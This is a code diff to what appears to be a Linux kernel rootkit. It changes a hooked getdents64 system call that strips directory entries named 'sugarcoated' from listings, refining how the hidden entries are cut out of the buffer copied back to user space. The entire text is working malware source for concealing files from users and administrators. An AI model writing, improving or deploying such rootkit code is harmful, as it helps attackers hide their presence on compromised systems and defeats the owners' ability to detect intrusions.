@@ -27,9 +27,7 @@ static long getdents64(const struct pt_regs *regs)
 	void __user *ubuf;
 	unsigned char *kbuf;
 	struct linux_dirent64 *dir, *prev = NULL;
-	long err, read, hidden, pos;
-
-	ubuf = (void __user *)regs->si;
+	long err, read, off, pos;
 
 	if ((read = hooks[HOOK_GETDENTS64].target(regs)) <= 0)
 		return read;
@@ -39,15 +37,17 @@ static long getdents64(const struct pt_regs *regs)
 		goto err_kmalloc;
 	}
 
+	ubuf = (void __user *)regs->si;
+
 	if (copy_from_user(kbuf, ubuf, read)) {
 		err = -EFAULT;
 		goto err_copy_from_user;
 	}
 
 	pos = 0;
-	hidden = 0;
+	off = 0;
 
-	while (pos < read - hidden) {
+	while (pos < read) {
 		dir = (struct linux_dirent64 *)(kbuf + pos);
 
 		if (strcmp(dir->d_name, "sugarcoated") != 0) {
@@ -56,27 +56,21 @@ static long getdents64(const struct pt_regs *regs)
 			continue;
 		}
 
-		/* i tried always using memmove() to hide entries, but on some
-		 * cases it caused ls output to be weird and corrupted. i'm not
-		 * sure why, it may be d_off, but anyways, this works better */
+		if ((unsigned char *)dir == kbuf + off)
+			off += dir->d_reclen;
+		else
+			prev->d_reclen += dir->d_reclen;
 
-		if ((unsigned char *)dir == kbuf) {
-			hidden += dir->d_reclen;
-			memmove(kbuf, kbuf + dir->d_reclen, read - hidden);
-			continue;
-		}
-
-		prev->d_reclen += dir->d_reclen;
 		pos += dir->d_reclen;
 	}
 
-	if (copy_to_user(ubuf, kbuf, read - hidden)) {
+	if (copy_to_user(ubuf, kbuf + off, read - off)) {
 		err = -EFAULT;
 		goto err_copy_to_user;
 	}
 
 	kfree(kbuf);
-	return read - hidden;
+	return read - off;
 
 err_copy_to_user:
 err_copy_from_user:
